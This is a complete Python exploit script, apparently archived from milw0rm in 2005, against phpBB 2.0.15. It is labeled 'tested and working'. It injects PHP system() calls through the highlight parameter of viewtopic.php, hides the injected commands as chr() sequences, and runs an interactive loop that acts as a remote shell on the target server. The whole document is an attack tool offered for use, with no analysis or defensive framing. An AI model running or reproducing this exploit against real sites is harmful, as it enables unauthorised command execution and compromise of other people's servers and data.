# tested and working /str0ke

#!/usr/bin/pyth0n
#
###############################################################  this exploit for
                                                              #  phpBB 2.0.15
print "\nphpBB 2.0.15 arbitrary command execution eXploit"    #  emulates a shell,
print " 2005 by rattle@awarenetwork.org"                      #  rather than
print " well, just because there is none."                    #  sending a single
                                                              #  command.
import sys                                                 ####
from urllib2 import Request, urlopen
from urlparse import urlparse, urlunparse
from urllib import quote as quote_plus

INITTAG = '<g0>'
ENDTAG  = '</g0>'

def makecmd(cmd):
    return reduce(lambda x,y: x+'.chr(%d)'%ord(y),cmd[1:],'chr(%d)'%ord(cmd[0]))


_ex  = "%sviewtopic.php?t=%s&highlight=%%27."
_ex += "printf(" + makecmd(INITTAG) + ").system(%s)."
_ex += "printf(" + makecmd(ENDTAG) + ").%%27"


def usage():
    print """Usage: %s <forum> <topic>

    forum - fully qualified url to the forum
            example: http://www.host.com/phpBB/

    topic - ID of an existing topic. Well you
            will have to check yourself.

"""[:-1] % sys.argv[0]; sys.exit(1)


if __name__ == '__main__':

    if len(sys.argv) < 3 or not sys.argv[2].isdigit():
        usage()
    else:
        print
        url = sys.argv[1]
        if url.count("://") == 0:
            url = "http://" + url
        url = list(urlparse(url))
        host = url[1]
        if not host: usage()

        if not url[0]: url[0] = 'http'
        if not url[2]: url[2] = '/'
        url[3] = url[4] = url[5] = ''

        url = urlunparse(url)
	if url[-1] != '/': url += '/'

        topic = quote_plus((sys.argv[2]))

        while 1:

            try:
                cmd = raw_input("[%s]$ " % host).strip()
                if cmd[-1]==';': cmd=cmd[:-1]

                if (cmd == "exit"): break
                else: cmd = makecmd(cmd)

		out = _ex % (url,topic,cmd)

                try: ret = urlopen(Request(out)).read()
                except KeyboardInterrupt: continue
                except: pass

                else:
                    ret = ret.split(INITTAG,1)
                    if len(ret)>1: ret = ret[1].split(ENDTAG,1)
                    if len(ret)>1:
                        ret = ret[0].strip();
                        if ret: print ret
                        continue;

                print "EXPLOIT FAILED"

            except:
                continue

# milw0rm.com [2005-06-29]